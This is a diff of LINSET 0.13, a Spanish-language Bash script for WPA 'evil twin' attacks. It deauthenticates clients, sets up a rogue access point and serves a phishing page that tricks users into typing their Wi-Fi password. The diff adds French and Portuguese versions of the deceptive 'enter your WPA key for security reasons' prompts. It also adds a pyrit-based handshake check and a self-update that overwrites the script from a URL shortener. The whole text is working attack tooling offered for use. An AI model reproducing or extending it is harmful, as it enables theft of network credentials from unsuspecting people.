@@ -177,7 +177,7 @@
 ## #Mejorada la busqueda de actualizaciones (casi directa)
 ## #Cambiada ruta de guardado del backup
 ##
-########## 06-03-2014 LINSET 0.13
+########## 21-03-2014 LINSET 0.13
 ##
 ## #Ampliado tiempo de espera antes de detener el atque
 ## #Corregido bug al hacer backup
@@ -185,6 +185,12 @@
 ## #Desautentificacion masiva se hace exclusivamente con mdk3
 ## #Fallo al reiniciar networkmanager cuando acaba el ataque
 ## #Fix cuando se autocierra linset despues de acabar el ataque
+## #Añadido pyrit a dependecias
+## #Funcion de comprobacion estricta del handshake
+## #Eliminadas dependencias inecesarias
+## #Mayor desplazamiento por los menus
+## #Añadido lenguaje Frances
+## #Añadido lenguaje Portugues
 ## 
 ##########
 clear
@@ -198,9 +204,9 @@ DUMP_PATH="/tmp/TMPlinset"
 # Numero de desautentificaciones
 DEAUTHTIME="8"
 # Numero de revision
-revision=32
+revision=33
 # Numero de version
-version=0.12
+version=0.13
 # Rango de IP que se usaran en DHCP
 IP=192.168.1.1
 # Crea variable de de una red a partir del Gateway
@@ -395,7 +401,25 @@ DIALOG_WEB_BACK_IT="Indietro"
 DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
 DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"
 
+#Mensajes de interfaces web Frances
+DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
+DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
+DIALOG_WEB_SUBMIT_FR="Valider"
+DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
+DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
+DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
+DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
+DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"
 
+#Mensajes de interfaces web Portugues
+DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
+DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
+DIALOG_WEB_SUBMIT_POR="Enviar"
+DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
+DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
+DIALOG_WEB_BACK_POR="Voltar"
+DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
+DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 
 # Muestra el mensaje principal del script
 function mostrarheader(){
@@ -492,15 +516,6 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Grep............"
-	if ! hash grep 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$rescolor""
-		salir=1
-	else
-		echo -e "\e[1;32mOK!"$rescolor""
-	fi
-	sleep 0.025
-	
 	echo -ne "Hostapd........."
 	if ! hash hostapd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -546,15 +561,6 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Modprobe........"
-	if ! hash modprobe 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$rescolor""
-		salir=1
-	else
-		echo -e "\e[1;32mOK!"$rescolor""
-	fi
-	sleep 0.025
-	
 	echo -ne "Php5-cgi........"
 	if ! [ -f /usr/bin/php-cgi ]; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -564,8 +570,8 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Python.........."
-	if ! hash python 2>/dev/null; then
+	echo -ne "Pyrit..........."
+	if ! hash pyrit 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
 	else
@@ -573,8 +579,8 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
-	echo -ne "Rmmod..........."
-	if ! hash rmmod 2>/dev/null; then
+	echo -ne "Python.........."
+	if ! hash python 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
 		salir=1
 	else
@@ -650,7 +656,7 @@ if [ $LINSET_DEBUG != 1 ]; then
 			if [ "$revision" != "$revision_online" ]; then
 				
 				cp $0 $HOME/linset_rev-$revision.backup
-				wget --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" http://goo.gl/Y5JX7c -O $0 -q
+				curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" -L http://goo.gl/Y5JX7c -s -o $0
 				echo
 				echo
 				echo -e ""$rojo"Actualizado con exito! Reiniciando el script para aplicar los cambios..."$rescolor""
@@ -1020,15 +1026,15 @@ function askAP {
 		echo "                                       "
 		echo -e "      "$verde"1)"$rescolor" Hostapd ("$rojo"Recomendado"$rescolor")"
 		echo -e "      "$verde"2)"$rescolor" airbase-ng (Conexion mas lenta)"
-		echo -e "      "$verde"3)"$rescolor" Salir"
+		echo -e "      "$verde"3)"$rescolor" Atras"
 		echo "                                       "
 		echo -n "      #> "
 		read yn
 		echo ""
 		case $yn in
-			1 ) fakeapmode="hostapd"; authmode="handshake"; askclientsel; break ;;
+			1 ) fakeapmode="hostapd"; authmode="handshake"; deauthforce; break ;;
 			2 ) fakeapmode="airbase-ng"; askauth; break ;;
-			3 ) exitmode; break ;;
+			3 ) selection; break ;;
 			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
 		esac
 	done 
@@ -1047,20 +1053,45 @@ function askauth {
 		echo "                                       "
 		echo -e "      "$verde"1)"$rescolor" Handshake ("$rojo"Recomendado"$rescolor")"
 		echo -e "      "$verde"2)"$rescolor" wpa_supplicant (Menos efectivo / Mas fallos)"
-		echo -e "      "$verde"3)"$rescolor" Salir"
+		echo -e "      "$verde"3)"$rescolor" Atras"
 		echo "                                       "
 		echo -n "      #> "
 		read yn
 		echo ""
 		case $yn in
-			1 ) authmode="handshake"; askclientsel; break ;;
+			1 ) authmode="handshake"; deauthforce; break ;;
 			2 ) authmode="wpa_supplicant"; webinterface; break ;;
-			3 ) exitmode; break ;;
+			3 ) askAP; break ;;
 			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
 		esac
 	done 
 	
 } 
+
+function deauthforce {
+	
+	conditional_clear
+	
+	mostrarheader
+	while true; do
+		
+		echo "TIPO DE COMPROBACION DEL HANDSHAKE"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" Estricto"
+		echo -e "      "$verde"2)"$rescolor" Normal (Posibilidades de fallo)"
+		echo -e "      "$verde"3)"$rescolor" Atras"
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) handshakemode="hard"; askclientsel; break ;;
+			2 ) handshakemode="normal"; askclientsel; break ;;
+			3 ) askauth; break ;;
+			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
+		esac
+	done 
+}
 
 ############################################### < MENU > ###############################################
 
@@ -1191,10 +1222,18 @@ function capture {
 # Comprueba el handshake antes de continuar
 function checkhandshake {
 	
-	if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
-		killall airodump-ng &>$linset_output_device
-		webinterface
-		break
+	if [ "$handshakemode" = "normal" ]; then
+		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
+			killall airodump-ng &>$linset_output_device
+			webinterface
+			break
+		fi
+	elif [ "$handshakemode" = "hard" ]; then
+		if pyrit -r $DUMP_PATH/$Host_MAC-01.cap analyze | grep -q "good,"; then
+			killall airodump-ng &>$linset_output_device
+			webinterface
+			break
+		fi
 	fi
 }
 
@@ -1237,10 +1276,12 @@ function webinterface {
 			echo "SELECCIONA IDIOMA"
 			echo
 			
-			echo -e "$verde""1)"$rescolor" English [ENG]"
-			echo -e "$verde""2)"$rescolor" Spanish [ESP]"
-			echo -e "$verde""3)"$rescolor" Italy   [IT]"
-			echo -e "$verde""4)"$rescolor" \e[1;31mAtras"$rescolor""
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" Italy       [IT]"
+			echo -e "$verde""4)"$rescolor" French      [FR]"
+			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
+			echo -e "$verde""6)"$rescolor" \e[1;31mAtras"$rescolor""
 			
 			echo
 			echo -n "#? "
@@ -1281,6 +1322,28 @@ function webinterface {
 				NEUTRA
 				break
 			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				NEUTRA
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				NEUTRA
+				break
+			elif [ "$linea" = "6" ]; then
 				continue
 			fi
 		fi
